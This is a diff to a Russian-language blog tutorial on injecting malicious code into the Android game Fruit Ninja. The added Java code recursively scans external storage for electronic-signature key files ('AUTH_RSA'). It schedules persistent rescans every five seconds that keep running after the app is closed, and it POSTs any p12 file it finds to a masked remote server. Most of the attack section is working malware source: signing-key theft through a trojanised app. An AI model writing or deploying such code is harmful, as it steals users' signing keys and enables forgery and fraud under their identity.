@@ -149,9 +149,11 @@
 
 Напомню: нам необходимо заразить игру Ninja Fruit своим кодом, который будет сканировать external storage, искать там ЭЦП и отсылать на сервер. Для этого, в начале, нам надо написать сам сканер. 
 
-Он состоит из трех основных классов: ```StageAttack```, ```MaliciousService```, MaliciousTaskManager. На MainActivity не обращайте внимание, оно нужно было лишь для быстрого тестирования.
+Он состоит из трех основных классов: ```StageAttack```, ```MaliciousService```, ```MaliciousTaskManager```. На MainActivity не обращайте внимание, оно нужно было лишь для быстрого тестирования.
 
->> StageAttack - состоит из одного статического метода. Именно с него начинается наша атака, именно он запускает все далнейшие процедуры и вызов именно его мы будем инжектить во Fruit Ninja.
+![img](assets\images\sign_scan\prj_struct.png)
+
+```StageAttack``` - состоит из одного статического метода. Именно с него начинается наша атака, именно он запускает все далнейшие процедуры и вызов именно его мы будем инжектить во Fruit Ninja. Метод лишь запускает наш сервис.
 
 {% highlight java %}
 public class StageAttack {
@@ -164,4 +166,91 @@ public class StageAttack {
     }
 }
 
+{% endhighlight %}
+
+```MaliciousService``` - сервис, который переодически сканирует external storage на предмет ЭЦП. Если находит, отсылает на сервер. Делает это, даже если приложение закрыть.
+
+Рекурсивно осуществляем поиск по всему external storage:
+
+{% highlight java %}
+private String pwn2(File dir) {
+
+        String path = null;
+        try {
+
+            File[] list = dir.listFiles();
+
+            if (list == null) {
+                Log.d(TAG, "list is null!");
+                return null;
+            }
+
+            for (File f : list) {
+
+                if (!containsSymlink(f)) {
+
+                    if (f.isDirectory()) {
+                        path = pwn2(f);
+                        if (path != null)
+                            return path;
+                    } else {
+                        path = f.getAbsolutePath();
+                        if (path.contains("AUTH_RSA")) {
+                            Log.d(TAG, "AUTH_RSA found here - " + path);
+                            return path;
+                        }
+                    }
+                }
+            }
+        } catch (Exception e) {
+            Log.e(TAG, e.getMessage());
+        }
+        return null;
+    }
+{% endhighlight %}
+
+Если ЭЦП не найдено, мы планируем повторить тоже самое через 5 секунд. Мы должны использовать именно класс ```AlarmManager``` и планировать методом ```setExactAndAllowWhileIdle```, так как это единственный способ планирования задач, с высокой точностью, в актуальном андроиде.
+
+{% highlight java %}
+private void scheduleMalService() {
+
+        Context ctx = getApplicationContext();
+        AlarmManager alarmMgr = (AlarmManager) ctx.getSystemService(Context.ALARM_SERVICE);
+        Intent intent = new Intent(ctx, MaliciousTaskManager.class);
+
+        final int _id = (int) System.currentTimeMillis();
+        PendingIntent alarmIntent = PendingIntent.getBroadcast(ctx, _id, intent, 0);
+
+        alarmMgr.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis() +
+                5000, alarmIntent);
+    }
+{% endhighlight %}
+
+Если ЭЦП найдено, то мы отправляем файл на сервер:
+
+{% highlight java %}
+private void sendToServer(String path) {
+        Log.d(TAG, "Sending p12 file to server");
+        try {
+            File file = new File(path);
+            URL url = new URL("http://xxxxxxxxxx");
+            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
+            urlConnection.setConnectTimeout(30 * 1000);
+
+            urlConnection.setRequestMethod("POST");
+            urlConnection.setDoOutput(true);
+            urlConnection.setRequestProperty("Content-Type", "application/octet-stream");
+
+            DataOutputStream request = new DataOutputStream(urlConnection.getOutputStream());
+            request.write(readFileToByteArray(file));
+            request.flush();
+            request.close();
+
+            int respCode = urlConnection.getResponseCode();
+            Log.d(TAG, "Return status code: " + respCode);
+
+        } catch (Exception e) {
+            Log.d(TAG, e.getMessage());
+        }
+    }
 {% endhighlight %}
